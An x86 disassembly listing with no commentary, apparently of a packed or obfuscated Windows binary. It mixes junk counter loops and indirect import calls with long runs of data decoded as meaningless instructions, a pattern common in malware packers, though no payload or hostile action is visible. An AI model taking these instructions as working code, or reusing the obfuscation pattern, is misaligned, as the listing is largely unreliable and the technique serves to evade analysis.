  40941b:	jbe    0x4093dd
  40941d:	int    0x35
  40941f:	aas    
  409420:	push   0x62
  409422:	test   DWORD PTR [esi+0x37],eax
  409425:	(bad)  
  409426:	mov    bl,0x92
  409428:	mov    esp,0x9609e41c
  40942d:	inc    esi
  40942e:	mov    ebp,0xf60358b4
  409433:	jg     0x4093e2
  409435:	outs   dx,BYTE PTR ds:[esi]
  409436:	cli    
  409437:	std    
  409438:	stos   DWORD PTR es:[edi],eax
  409439:	iret   
  40943a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40943b:	mov    eax,ds:0x5b924ab0
  409440:	add    edi,DWORD PTR [ecx-0x20]
  409443:	jbe    0x4094b7
  409445:	jmp    FWORD PTR [eax-0x75c1f1d1]
  40944b:	mov    bh,0x36
  40944d:	mov    ch,BYTE PTR [ebx-0xa3af73d]
  409453:	stos   DWORD PTR es:[edi],eax
  409454:	pop    ebp
  409455:	in     eax,dx
  409456:	and    dh,BYTE PTR [edi+eax*1-0x628f86aa]
  40945d:	imul   ecx,esp,0x1f028d68
  409463:	test   eax,ecx
  409465:	mov    cl,0x72
  409467:	out    0x74,eax
  409469:	and    DWORD PTR [edx],ebx
  40946b:	push   ss
  40946c:	sbb    ecx,esi
  40946e:	retf   
  40946f:	jecxz  0x409413
  409471:	xchg   esi,eax
  409472:	adc    dl,BYTE PTR [ecx]
  409474:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  40947b:	and    DWORD PTR ds:0x43372b,0x0
  409485:	xor    ecx,ecx
  409487:	add    ecx,DWORD PTR ds:0x43372b
  40948d:	inc    ecx
  40948e:	mov    DWORD PTR ds:0x43372b,ecx
  409494:	cmp    DWORD PTR ds:0x43372b,0x23
  40949b:	jne    0x4094bf
  4094a1:	push   0x7f04
  4094a6:	push   DWORD PTR [ebp-0xc]
  4094a9:	push   DWORD PTR [ebp-0x28]
  4094ac:	push   0x10bc
  4094b1:	push   DWORD PTR [ebp-0x10]
  4094b4:	push   0x1509
  4094b9:	call   DWORD PTR ds:0x41239c
  4094bf:	cmp    DWORD PTR ds:0x43372b,0x13
  4094c6:	jb     0x409485
  4094cc:	sub    DWORD PTR ds:0x433613,ecx
  4094d2:	lea    eax,[ebp-0x14]
  4094d5:	and    DWORD PTR ds:0x433677,0x0
  4094df:	jmp    0x4094f1
  4094e4:	mov    ebx,DWORD PTR ds:0x433677
  4094ea:	inc    ebx
  4094eb:	mov    DWORD PTR ds:0x433677,ebx
  4094f1:	cmp    DWORD PTR ds:0x433677,0x13
  4094f8:	jae    0x40951b
  4094fe:	cmp    DWORD PTR ds:0x433677,0x22
  409505:	jne    0x409516
  40950b:	push   0x24ee
  409510:	call   DWORD PTR ds:0x4123a0
  409516:	jmp    0x4094e4
  40951b:	mov    DWORD PTR [ebp-0x20],eax
  40951e:	and    DWORD PTR ds:0x43367b,0x0
  409528:	jmp    0x409538
  40952d:	mov    eax,ds:0x43367b
  409532:	inc    eax
  409533:	mov    ds:0x43367b,eax
  409538:	cmp    DWORD PTR ds:0x43367b,0x11
  40953f:	jae    0x409578
  409545:	cmp    DWORD PTR ds:0x43367b,0x9
  40954c:	jne    0x40955b
  409552:	push   DWORD PTR [ebp-0x1c]
  409555:	call   DWORD PTR ds:0x412018
  40955b:	cmp    DWORD PTR ds:0x43367b,0x8
  409562:	jne    0x409573
  409568:	mov    eax,ds:0x43367b
  40956d:	inc    eax
  40956e:	mov    ds:0x43367b,eax
  409573:	jmp    0x40952d
  409578:	mov    eax,DWORD PTR [ebp-0x14]
  40957b:	sbb    ebx,0x50bb
  409581:	mov    ecx,DWORD PTR [ebp-0x20]
  409584:	xor    eax,esi
  409586:	and    ebx,0x1e7c
  40958c:	add    eax,edi
  40958e:	sub    DWORD PTR ds:0x4336b7,ecx
  409594:	mov    DWORD PTR [ecx],eax
  409596:	or     ebx,ebx
  409598:	mov    eax,ds:0x413cb2
  40959d:	mov    ebx,0x8e12feb8
  4095a2:	mov    DWORD PTR [ebp-0xc],ebx
  4095a5:	xor    DWORD PTR ds:0x433623,0x433613
  4095af:	mov    eax,DWORD PTR [eax]
  4095b1:	and    DWORD PTR ds:0x433633,0x43372f
  4095bb:	mov    cx,WORD PTR [ebp-0x4]
  4095bf:	jmp    0x4098e0
  4095c4:	jge    0x40957b
  4095c6:	mov    edx,0x397172fe
  4095cb:	mov    ch,0x54
  4095cd:	ds sbb eax,0xebfbe10b
  4095d3:	sbb    ch,BYTE PTR [ecx+ebx*8+0x7e]
  4095d7:	jle    0x409653
  4095d9:	jge    0x409659
  4095db:	jle    0x409608
  4095dd:	mov    dl,0x67
  4095df:	pop    ecx
  4095e0:	mov    bl,0x26
  4095e2:	fsubp  st(4),st
  4095e4:	or     DWORD PTR [edi],ebx
  4095e6:	inc    esi
  4095e7:	mov    ecx,0x22255e08
  4095ec:	lock popf 
  4095ee:	ss cdq 
  4095f0:	sbb    eax,0x6174344f
  4095f5:	jb     0x409624
  4095f7:	fucomp st(0)
  4095f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4095fa:	cdq    
  4095fb:	jmp    0x68b50914
  409600:	push   es
  409601:	into   
  409602:	lods   al,BYTE PTR ds:[esi]
  409603:	pop    ds
  409604:	xchg   esp,eax
  409605:	out    dx,eax
  409606:	and    BYTE PTR [ebp+esi*2+0x437e0f68],bl
  40960d:	xchg   BYTE PTR [ecx],ah
  40960f:	inc    edi
  409610:	push   ebx
  409611:	mov    eax,ds:0x8c6430f8
  409616:	add    DWORD PTR [ecx],0xfffffffb
  409619:	ret    0x4f8d
  40961c:	ja     0x40967e
  40961e:	pop    edx
  40961f:	xor    eax,0xdfd75b3c
  409624:	jmp    0x7b938d6e
  409629:	jmp    0x8bee23d9
  40962e:	sub    al,0xc3
  409630:	fld    QWORD PTR [edx-0x4c]
  409633:	cmc    
  409634:	mov    edi,0x562975ac
  409639:	fwait
  40963a:	jne    0x409665
  40963c:	popf   
  40963d:	mov    BYTE PTR [ebx],0x92
  409640:	cwde   
  409641:	xchg   edx,eax
  409642:	fst    QWORD PTR gs:[edi-0xf]
  409646:	data16 mul BYTE PTR [esp+eax*2-0x51]
  40964b:	sbb    ah,BYTE PTR [eax]
  40964d:	jo     0x40966f
  40964f:	test   esi,ebp
  409651:	jmp    0x4096a7
  409653:	add    eax,0x52a79906
  409658:	mov    eax,0x12398c4d
  40965d:	push   0xc5f89a0a
  409662:	push   edi
  409663:	sti    
  409664:	sbb    al,0x7f
  409666:	jge    0x4095f7
  409668:	inc    edx
  409669:	push   ecx
  40966a:	mov    ch,0x16
  40966c:	xchg   esp,eax
  40966d:	(bad)  
  40966e:	out    dx,eax
  40966f:	mov    al,ds:0xde4045a3
  409674:	push   ecx
  409675:	aaa    
  409676:	inc    eax
  409677:	jp     0x4096ef
  409679:	sub    eax,0x9bd91c5e
  40967e:	test   DWORD PTR [ecx+ebx*8+0x19],ebp
  409682:	je     0x4096de
  409684:	leave  
  409685:	pusha  
  409686:	or     edi,esp
  409688:	rol    DWORD PTR [ebp+0x10fe6a93],cl
  40968e:	int3   
  40968f:	sub    al,0x3f
  409691:	mov    edx,edi
  409693:	imul   edi,DWORD PTR [ebp-0x68472dc3],0xffffffab
  40969a:	inc    edx
  40969b:	fwait
  40969c:	sub    edi,DWORD PTR [ebx+ebp*4+0x5b7e6f9d]
  4096a3:	or     ah,dh
  4096a5:	add    eax,0x372e82eb
  4096aa:	repnz mov bh,dl
  4096ad:	shr    edx,1
  4096af:	fs aad 0x81
  4096b2:	jmp    0x409648
  4096b4:	fsubp  st(1),st
  4096b6:	mov    esi,0x603d5b6d
  4096bb:	mov    ebp,0x1ca71be9
  4096c0:	push   eax
  4096c1:	jg     0x409699
  4096c3:	scas   al,BYTE PTR es:[edi]
  4096c4:	and    ah,BYTE PTR [edx-0x45ff0e6f]
  4096ca:	mov    ecx,ecx
  4096cc:	addr16 push ds
  4096ce:	sti    
  4096cf:	psrlq  mm1,mm4
  4096d2:	pushf  
  4096d3:	push   0x2d
  4096d5:	mov    ss,ecx
  4096d7:	ss in  al,dx
  4096d9:	popa   
  4096da:	in     al,0x5d
  4096dc:	into   
  4096dd:	cmp    eax,0x3f5d05d8
  4096e2:	jl     0x409700
  4096e4:	div    esp
  4096e6:	mov    ds:0x22022a7b,eax
  4096eb:	push   edi
  4096ec:	adc    eax,0x573b4e2d
  4096f1:	daa    
  4096f2:	add    bh,BYTE PTR [edx+0x6]
  4096f5:	xchg   ecx,eax
  4096f6:	mov    ds:0x3da2a11c,eax
  4096fb:	adc    al,0x50
  4096fd:	mov    esi,0x9c54d198
  409702:	ins    BYTE PTR es:[edi],dx
  409703:	adc    DWORD PTR [esi+0x78],esi
  409706:	loopne 0x4096fe
  409708:	sbb    DWORD PTR [edx],edx
  40970a:	stos   DWORD PTR es:[edi],eax
  40970b:	loope  0x4096bf
  40970d:	test   DWORD PTR [ebp-0x6f9a2252],edx
  409713:	push   esi
  409714:	push   ebx
  409715:	leave  
  409716:	mov    dl,0x5e
  409718:	dec    esp
  409719:	mov    al,0x80
  40971b:	xchg   esi,eax
  40971c:	ret    
  40971d:	xor    al,BYTE PTR [ecx]
  40971f:	mov    ebp,DWORD PTR [eax]
  409721:	pop    ss
  409722:	enter  0x2b61,0xca
  409726:	in     eax,dx
  409727:	into   
  409728:	jp     0x409749
  40972a:	fmul   QWORD PTR [eax+ecx*2]
  40972d:	add    al,0xab
  40972f:	xchg   BYTE PTR [edi],cl
  409731:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409732:	push   ecx
  409733:	fnstcw WORD PTR [esp+edx*8-0x1e]
  409737:	fimul  WORD PTR [edx+0x4c10ab0e]
  40973d:	push   es
  40973e:	(bad)  
  40973f:	retf   
  409740:	dec    esp
  409741:	shl    BYTE PTR [esi+0x68968335],1
  409747:	daa    
  409748:	lods   eax,DWORD PTR ds:[esi]
  409749:	in     al,dx
  40974a:	hlt    
  40974b:	jno    0x40972b
  40974d:	in     al,dx
  40974e:	fs in  eax,dx
  409750:	mov    bh,BYTE PTR [ecx+ebp*1]
  409753:	outs   dx,DWORD PTR ds:[esi]
  409754:	rol    DWORD PTR [ebx-0x29],1
  409757:	mov    esi,0xe559bd13
  40975c:	jg     0x409703
  40975e:	out    0x79,al
  409760:	and    eax,0x819f5cca
  409765:	(bad)  
  409767:	push   esp
  409768:	jnp    0x409711
  40976a:	lods   al,BYTE PTR ds:[esi]
  40976b:	jno    0x409709
  40976d:	nop
  40976e:	mov    bl,0xf
  409770:	mov    BYTE PTR [eax+0x4e],dh
  409773:	repz cmc 
  409775:	mov    ah,0x52
  409777:	push   ds
  409778:	cmc    
  409779:	mov    DWORD PTR [ebx-0x1b4cd872],edx
  40977f:	fisubr WORD PTR [eax]
  409781:	push   ecx
  409782:	test   al,0xf
  409784:	jns    0x409757
  409786:	adc    eax,0x8192c27c
  40978b:	out    0x65,eax
  40978d:	in     al,dx
  40978e:	in     al,dx
  40978f:	in     eax,0x98
  409791:	int3   
  409792:	push   eax
  409793:	push   ebx
  409794:	adc    al,0xa7
  409796:	neg    BYTE PTR [esi-0x26a4a0b4]
  40979c:	jecxz  0x409776
  40979e:	mov    edx,0x3a5ddf5f
  4097a3:	inc    esp
  4097a4:	mov    ecx,ebx
  4097a6:	clc    
  4097a7:	push   es
  4097a8:	jno    0x409738
  4097aa:	pushf  
  4097ab:	push   ds
  4097ac:	push   es
  4097ad:	mov    ds:0xeea123b3,eax
  4097b2:	aas    
  4097b3:	ins    BYTE PTR es:[edi],dx
  4097b4:	data16 adc al,0x79
  4097b7:	lods   al,BYTE PTR ds:[esi]
  4097b8:	mov    ecx,0x8353be9
  4097bd:	add    ebx,eax
  4097bf:	pop    edx
  4097c0:	sub    edx,DWORD PTR [ecx+0x303b4cd2]
  4097c6:	push   ds
  4097c7:	popf   
  4097c8:	xchg   BYTE PTR [ecx-0x14],ah
  4097cb:	scas   al,BYTE PTR es:[edi]
  4097cc:	mov    bh,0x17
  4097ce:	fld    st(2)
  4097d0:	in     eax,dx
  4097d1:	mov    dh,0x2e
  4097d3:	xor    BYTE PTR [bx+si],bl
  4097d6:	jmp    0xd4a7:0x160742d1
  4097dd:	data16 fs add al,0xa7
  4097e1:	(bad)  
  4097e3:	pop    edx
  4097e4:	sti    
  4097e5:	xchg   ebx,eax
  4097e6:	push   edi
  4097e7:	adc    al,0xc0
  4097e9:	xor    ax,0xd185
  4097ed:	cld    
  4097ee:	jns    0x409832
  4097f0:	push   edx
  4097f1:	mul    cl
  4097f3:	sub    dl,BYTE PTR [ebx-0x51]
  4097f6:	mov    al,ds:0xed982bf1
  4097fb:	and    al,0xe2
  4097fd:	mov    bl,0x5f
  4097ff:	xchg   dx,ax
  409801:	push   ebx
  409802:	cmc    
  409803:	mov    dl,0x7
  409805:	mov    eax,ds:0x5b3755ee
  40980a:	mov    ebx,0xd240b7f3
  40980f:	lock cmp eax,DWORD PTR [ecx+0x73]
  409813:	jl     0x409889
  409815:	ja     0x409876
  409817:	pop    ebx
  409818:	dec    esi
  409819:	lods   eax,DWORD PTR ds:[esi]
  40981a:	sbb    al,0xa0
  40981c:	retf   
  40981d:	inc    ebx
  40981e:	mov    ah,0xa7
  409820:	xchg   esp,eax
  409821:	not    DWORD PTR [edi]
  409823:	add    al,0xe7
  409825:	xchg   ebp,edx
  409827:	mov    bh,0x87
  409829:	or     al,0x7c
  40982b:	call   0xb6ac:0xd1c2cb58
  409832:	lods   eax,DWORD PTR ds:[esi]
  409833:	pop    ss
  409834:	add    DWORD PTR ds:0x2cfa4121,esi
  40983a:	in     eax,0xaf
  40983c:	sub    DWORD PTR [edx+ebp*8-0x66],0xffbac200
  409844:	icebp  
  409845:	into   
  409846:	es xchg edx,eax
  409848:	jns    0x409882
  40984a:	or     ebx,ebx
  40984c:	pop    ecx
  40984d:	popa   
  40984e:	and    esi,esp
  409850:	(bad)  
  409851:	pxor   mm4,QWORD PTR [esi]
  409854:	add    BYTE PTR [edx+0xe67664],ah
  40985a:	out    dx,eax
  40985b:	sbb    esp,DWORD PTR [eax-0x281d1296]
  409861:	inc    edx
  409862:	inc    esp
  409863:	mov    al,0x58
  409865:	add    eax,DWORD PTR [ecx]
  409867:	rcr    DWORD PTR ds:[eax-0x2],0x8a
  40986c:	repnz in eax,0xd4
  40986f:	mov    ecx,0xe027c0a0
  409874:	mov    ebp,0x373d5b47
  409879:	mov    ah,0xbd
  40987b:	or     esp,edi
  40987d:	mov    dh,0xea
  40987f:	test   eax,0xeda5bb6a
  409884:	ret    
  409885:	clc    
  409886:	dec    edi
  409887:	lahf   
  409888:	jge    0x4098f0
  40988a:	push   es
  40988b:	pop    ebx
  40988c:	(bad)  
  40988d:	cld    
  40988e:	push   ebx
  40988f:	inc    esi
  409890:	inc    esi
  409891:	fwait
  409892:	cli    
  409893:	xchg   ecx,eax
  409894:	dec    ebp
  409895:	jbe    0x40990e
  409897:	nop
  409898:	or     esi,DWORD PTR [ebx]
  40989a:	inc    esi
  40989b:	xor    BYTE PTR [ebx+0x2e],ch
  40989e:	and    al,0x49
  4098a0:	pushf  
  4098a1:	sbb    ah,cl
  4098a3:	mov    edi,0xf293c9fe
  4098a8:	pop    esi
  4098a9:	out    0x3d,al
  4098ab:	int    0x4c
  4098ad:	cdq    
  4098ae:	outs   dx,BYTE PTR ds:[esi]
  4098af:	call   0xdc2998fa
  4098b4:	xchg   ecx,eax
  4098b5:	rol    DWORD PTR [ecx+0x79],cl
  4098b8:	cmp    al,0x9f
  4098ba:	out    0x85,eax
  4098bc:	fwait
  4098bd:	test   DWORD PTR [ebx-0x3d76a36a],ebx
  4098c3:	mov    eax,0x4205e2b6
  4098c8:	jo     0x409939
  4098ca:	pop    esp
  4098cb:	fnstsw WORD PTR [edx]
  4098cd:	cmp    ebp,0x689e164b
  4098d3:	mov    dl,bl
  4098d5:	mov    ecx,DWORD PTR [ecx+0x67]
  4098d8:	or     edi,DWORD PTR [eax-0x27]
  4098db:	daa    
  4098dc:	mov    esp,0xf20cbc6
  4098e1:	mov    bh,0xc9
  4098e3:	sbb    DWORD PTR ds:0x43373b,0x5a23
  4098ed:	add    ecx,DWORD PTR [eax]
  4098ef:	adc    DWORD PTR ds:0x4336a7,ebx
  4098f5:	mov    DWORD PTR [ebp-0x18],ecx
  4098f8:	and    eax,DWORD PTR ds:0x433637
  4098fe:	mov    eax,DWORD PTR [ebp+0x8]
  409901:	and    DWORD PTR ds:0x43366f,0x0
  40990b:	mov    ecx,DWORD PTR ds:0x43366f
  409911:	inc    ecx
  409912:	mov    DWORD PTR ds:0x43366f,ecx
  409918:	cmp    DWORD PTR ds:0x43366f,0x2e
  40991f:	jne    0x409933
  409925:	push   DWORD PTR [ebp-0x24]
  409928:	push   0x2be2
  40992d:	call   DWORD PTR ds:0x41201c
  409933:	cmp    DWORD PTR ds:0x43366f,0x1f
  40993a:	jb     0x40990b
  409940:	mov    DWORD PTR ds:0x4336a7,0x11
  40994a:	cmp    DWORD PTR ds:0x4336a7,0x0
  409951:	je     0x4099a3
  409957:	cmp    DWORD PTR ds:0x4336a7,0x6
  40995e:	jne    0x409977
  409964:	push   0x4337a4
  409969:	push   DWORD PTR [ebp-0x24]
  40996c:	push   0x64fc
  409971:	call   DWORD PTR ds:0x4121d0
  409977:	cmp    DWORD PTR ds:0x4336a7,0x7
  40997e:	jne    0x409991
  409984:	mov    ecx,DWORD PTR ds:0x4336a7
  40998a:	dec    ecx
  40998b:	mov    DWORD PTR ds:0x4336a7,ecx
  409991:	mov    ecx,DWORD PTR ds:0x4336a7
  409997:	dec    ecx
  409998:	mov    DWORD PTR ds:0x4336a7,ecx
  40999e:	jmp    0x40994a
  4099a3:	mov    ecx,DWORD PTR [ebp-0x8]
  4099a6:	xor    eax,esi
  4099a8:	add    eax,edi
  4099aa:	cmp    DWORD PTR [ecx],eax
  4099ac:	jmp    0x409ccd
  4099b1:	cmovbe ebx,DWORD PTR [esi+0x55e577e5]
  4099b8:	je     0x4099d6
  4099ba:	dec    edi
  4099bb:	cmc    
  4099bc:	fisttp QWORD PTR ds:0x68c878a5
  4099c2:	in     al,0x7e
  4099c4:	jle    0x409a40
  4099c6:	jge    0x409a46
  4099c8:	jle    0x40997a
  4099ca:	mov    cl,0x53
  4099cc:	(bad)  
  4099cd:	push   eax
  4099ce:	shl    DWORD PTR ds:0x9ec03be8,cl
  4099d4:	dec    ebp
  4099d5:	into   
  4099d6:	xchg   DWORD PTR [edi+0x18e75b4d],ebp
  4099dc:	and    BYTE PTR gs:[eax+0x41],dh
  4099e0:	sbb    DWORD PTR ss:[esi-0x2c47c43c],0x99fb99f3
  4099eb:	loop   0x40998f
  4099ed:	test   DWORD PTR [edi-0x4f2beb5b],edx
  4099f3:	cmp    ebx,DWORD PTR [edx]
  4099f5:	mov    al,al
  4099f7:	scas   eax,DWORD PTR es:[edi]
  4099f8:	dec    ebp
  4099f9:	dec    edx
  4099fa:	jmp    0x40997d
  4099fc:	mov    DWORD PTR [eax],ebp
  4099fe:	push   es
  4099ff:	cli    
  409a00:	(bad)  
  409a01:	cmc    
  409a02:	cmp    ch,BYTE PTR [ecx-0x3f]
  409a05:	loopne 0x409a15
  409a07:	sub    BYTE PTR [ecx+0x19],al
  409a0a:	mov    ch,0x40
  409a0c:	sahf   
  409a0d:	inc    esp
  409a0e:	sub    dl,0x90
  409a11:	aaa    
  409a12:	jno    0x4099d6
  409a14:	adc    eax,0x1b685414
  409a19:	xor    al,BYTE PTR [esi+0x15]
  409a1c:	or     eax,eax
  409a1e:	aad    0x12
  409a20:	ins    DWORD PTR es:[edi],dx
  409a21:	ins    BYTE PTR es:[edi],dx
  409a22:	mov    dh,0xf4
  409a24:	pop    edx
  409a25:	mov    esi,0xc9268ad3
  409a2a:	cmp    BYTE PTR [ebx+0x67],bh
  409a2d:	into   
  409a2e:	into   
  409a2f:	xor    al,0xd0
  409a31:	jmp    FWORD PTR [esi-0x3917a764]
  409a37:	jbe    0x409a2d
  409a39:	inc    esi
  409a3a:	cld    
  409a3b:	sub    BYTE PTR [ebp+0x31f14726],ch
  409a41:	dec    ebp
  409a42:	or     eax,eax
  409a44:	ins    DWORD PTR es:[edi],dx
  409a45:	imul   esi,DWORD PTR [esp+esi*1+0x736e0894],0x11
  409a4d:	out    0x58,eax
  409a4f:	xchg   edi,eax
  409a50:	loop   0x409aca
  409a52:	sbb    al,BYTE PTR ds:[edi-0x29]
  409a56:	out    0x58,eax
  409a58:	lods   eax,DWORD PTR ds:[esi]
  409a59:	sub    al,0xcb
  409a5b:	(bad)  
  409a5c:	jb     0x409a7e
  409a5e:	or     eax,0xf020b525
  409a63:	bound  ebp,QWORD PTR [edi+0x77f88ccc]
  409a69:	inc    edx
  409a6a:	inc    ebx
  409a6b:	(bad)  
  409a6c:	pusha  
  409a6d:	dec    edi
  409a6e:	adc    ecx,DWORD PTR [edi+0x1d]
  409a71:	pop    ds
  409a72:	popa   
  409a73:	add    ebx,DWORD PTR ds:0xbb1ff914
  409a79:	aaa    
  409a7a:	das    
  409a7b:	aad    0x5
  409a7d:	fucomip st,st(6)
  409a7f:	icebp  
  409a80:	cmp    cl,bl
  409a82:	mov    al,ds:0xc14cfdbf
  409a87:	cdq    
  409a88:	popa   
  409a89:	das    
  409a8a:	test   DWORD PTR [eax+0x5834e73c],ebp
  409a90:	mov    ah,0x21
  409a92:	not    dl
  409a94:	sti    
  409a95:	xchg   edx,eax
  409a96:	pop    esi
  409a97:	pop    esp
  409a98:	lock shl edx,cl
  409a9b:	jbe    0x409ad9
  409a9d:	xchg   edi,eax
  409a9e:	or     DWORD PTR [ecx+eax*2-0x3182fc8b],0xff1bcb4f
  409aa9:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  409aab:	call   0x7d573861
  409ab0:	rcr    BYTE PTR [edx-0x37],0x4a
  409ab4:	mov    BYTE PTR [ebp+0x26348e73],al
  409aba:	leave  
  409abb:	or     DWORD PTR [eax+0x8c0dc05],ebx
  409ac1:	xchg   edi,eax
  409ac2:	dec    eax
  409ac3:	or     al,0x9e
  409ac5:	push   es
  409ac6:	hlt    
  409ac7:	inc    ebx
  409ac8:	adc    bh,dl
  409aca:	rcl    DWORD PTR [ebp-0x4c],cl
  409acd:	gs enter 0xb557,0xcd
  409ad2:	aad    0xe5
  409ad4:	test   eax,0x2120c0d1
  409ad9:	daa    
  409ada:	and    eax,0x20d1fda1
  409adf:	sbb    al,0x9b
  409ae1:	pop    ebp
  409ae2:	sti    
  409ae3:	cmp    al,0x17
  409ae5:	sbb    eax,0x4186ac20
  409aea:	pop    edx
  409aeb:	call   0xb1f0:0xd27f4276
  409af2:	out    0xdd,eax
  409af4:	cmp    al,0x77
  409af6:	outs   dx,BYTE PTR ds:[esi]
  409af7:	sub    eax,0x390009e4
  409afc:	or     al,0x57
  409afe:	push   ss
  409aff:	inc    edx
  409b00:	lds    esp,FWORD PTR [edi-0x238f11d0]
  409b06:	inc    edx
  409b07:	ror    BYTE PTR [edi-0x4bb29bd1],0xda
  409b0e:	inc    ecx
  409b0f:	mov    WORD PTR [ecx+ebx*1],ss
  409b12:	stc    
  409b13:	jmp    0xd6cc2833
  409b18:	cwde   
  409b19:	or     ah,bh
  409b1b:	loop   0x409b5c
  409b1d:	dec    ebp
  409b1e:	mov    ecx,0xabba283b
  409b23:	aaa    
  409b24:	imul   edi,DWORD PTR [ecx-0x192d2c74],0x14
  409b2b:	xor    ah,ch
  409b2d:	shr    ch,cl
  409b2f:	in     al,0xe6
  409b31:	and    DWORD PTR [eax+0x587d9861],0xf4b7d40d
  409b3b:	aaa    
  409b3c:	ds jecxz 0x409b64
  409b3f:	dec    eax
  409b40:	mov    al,0x99
  409b42:	lods   al,BYTE PTR ds:[esi]
  409b43:	xchg   esp,eax
  409b44:	ret    0x113e
  409b47:	mov    al,0x59
  409b49:	ds jnp 0x409b23
  409b4c:	cs dec eax
  409b4e:	call   0x67b0e61c
  409b53:	or     eax,0xfd3e04c4
  409b58:	mov    WORD PTR [eax],?
  409b5a:	(bad)  
  409b5b:	mov    ah,0x22
  409b5d:	add    ax,WORD PTR [eax+0x60844df]
  409b64:	fadd   QWORD PTR [edx-0x6ba9ffaf]
  409b6a:	jne    0x409b52
  409b6c:	jmp    0x409b20
  409b6e:	add    BYTE PTR [esi],dl
  409b70:	pop    ebp
  409b71:	int3   
  409b72:	(bad)  
  409b73:	jne    0x409b45
  409b75:	int3   
  409b76:	shl    BYTE PTR [esi+0x467b38af],1
  409b7c:	sub    ebp,DWORD PTR [eax-0x67]
  409b7f:	or     al,0xbc
  409b81:	xchg   ebp,eax
  409b82:	or     bh,BYTE PTR [esi+eiz*8-0x34]
  409b86:	ja     0x409b0d
  409b88:	mov    al,0xba
  409b8a:	sbb    DWORD PTR [ecx+0x16684c99],ecx
  409b90:	mov    esi,0x6f88d2cf
  409b95:	js     0x409b36
  409b97:	jnp    0x409b20
  409b99:	out    dx,al
  409b9a:	mov    edi,0x75439303
  409b9f:	xor    dl,BYTE PTR [ebp+0x7c0d92f2]
  409ba5:	push   cs
  409ba6:	fnsave [esi]
  409ba8:	mov    al,BYTE PTR [ebx+0x17]
  409bab:	imul   ecx,DWORD PTR [ebx],0xffffff92
  409bae:	jp     0x409be0
  409bb0:	mov    ebx,0xd8df04da
  409bb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409bb6:	mov    bl,0x1e
  409bb8:	hlt    
  409bb9:	cld    
  409bba:	loopne 0x409be3
  409bbc:	dec    ebp
  409bbd:	icebp  
  409bbe:	inc    ebx
  409bbf:	sbb    eax,0xb784df98
  409bc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409bc5:	jg     0x409b57
  409bc7:	xor    DWORD PTR [ebx-0x2d],0x79984a88
  409bce:	push   ebx
  409bcf:	mov    eax,DWORD PTR [ecx]
  409bd1:	popa   
  409bd2:	mov    al,0x28
  409bd4:	cmp    BYTE PTR [ecx+0xa0f5eed],cl
  409bda:	ss (bad) 
  409bdc:	xor    eax,0xb3cc6f3f
  409be1:	test   al,0x9b
  409be3:	add    DWORD PTR [edx+0x6407d935],edx
  409be9:	add    eax,0x5dd7763c
  409bee:	cmp    ebp,DWORD PTR [esi+0x70733553]
  409bf4:	adc    edi,DWORD PTR [esi+0x680e51b8]
  409bfa:	jl     0x409c4d
  409bfc:	push   es
  409bfd:	cmp    BYTE PTR [ebx+0x37046199],0xd2
  409c04:	out    0x79,eax
  409c06:	or     ebp,DWORD PTR [esi-0x28]
  409c09:	mov    esi,0x842a77b6
  409c0e:	adc    DWORD PTR [ebx+0x35b836ae],eax
  409c14:	pop    eax
  409c15:	scas   al,BYTE PTR es:[edi]
  409c16:	mov    edx,0x539afb36
  409c1b:	fnstsw WORD PTR [ecx+0x5b]
  409c1e:	cs ja  0x409ba9
  409c21:	(bad)  
  409c22:	loope  0x409bae
  409c24:	ror    DWORD PTR [edi+0x0],1
  409c27:	loope  0x409c5e
  409c29:	idiv   BYTE PTR [esi-0x47]
  409c2c:	cwde   
  409c2d:	(bad)  
  409c2e:	adc    al,0x76
  409c30:	add    ch,dl
  409c32:	jge    0x409c19
  409c34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c35:	fisttp QWORD PTR [eax+0x7e]
  409c38:	pusha  
  409c39:	jns    0x409c79
  409c3b:	cmc    
  409c3c:	push   es
  409c3d:	mov    ebp,DWORD PTR [edx+ebx*4-0x26d576a2]
  409c44:	mov    bl,0x64
  409c46:	add    al,0xe
  409c48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c49:	ins    BYTE PTR es:[edi],dx
  409c4a:	mov    esi,0x9dbb8c4b
  409c4f:	gs adc al,0xc5
  409c52:	jge    0x409cc8
  409c54:	add    BYTE PTR [eax+eax*4],0x4c
  409c58:	(bad)  
  409c59:	xor    DWORD PTR [edi+ebx*1],ecx
  409c5c:	nop
  409c5d:	sbb    al,0xd8
  409c5f:	hlt    
  409c60:	xchg   esp,eax
  409c61:	std    
  409c62:	repz int 0x42
  409c65:	imul   esp,DWORD PTR [eax-0x3ba898ab],0x6dd8497
  409c6f:	pop    edi
  409c70:	les    esi,FWORD PTR [eax+0x1d]
  409c73:	mov    ebp,0x8978e870
  409c78:	das    
  409c79:	mov    eax,ds:0x62e89308
  409c7e:	mov    WORD PTR [ecx-0x80eee80],es
  409c84:	dec    edi
  409c85:	push   ecx
  409c86:	ror    DWORD PTR [ebp+0x39],cl
  409c89:	test   BYTE PTR [edi],dh
  409c8b:	xor    edx,DWORD PTR [eax+ebp*2+0x56]
  409c8f:	mov    bl,0xf8
  409c91:	and    al,0xc2
  409c93:	(bad)  
  409c94:	adc    edi,DWORD PTR [edi+ebx*8]
  409c97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c99:	out    dx,al
  409c9a:	js     0x409c8c
  409c9c:	(bad)  
  409c9d:	xchg   ebx,eax
  409c9e:	(bad)  
  409c9f:	iret   
  409ca0:	loopne 0x409c9b
  409ca2:	mov    ebp,0xff58368a
  409ca7:	rol    edx,1
  409ca9:	add    al,0x6
  409cab:	mov    ebp,0xc9508800
  409cb0:	push   edi
  409cb1:	or     al,BYTE PTR [ecx-0x3c]
  409cb4:	sahf   
  409cb5:	xchg   ebx,eax
  409cb6:	jns    0x409d20
  409cb8:	daa    
  409cb9:	int    0xbe
  409cbb:	mov    edx,edi
  409cbd:	pop    ecx
  409cbe:	outs   dx,DWORD PTR ds:[esi]
  409cbf:	inc    esi
  409cc0:	outs   dx,DWORD PTR ds:[esi]
  409cc1:	loope  0x409c8d
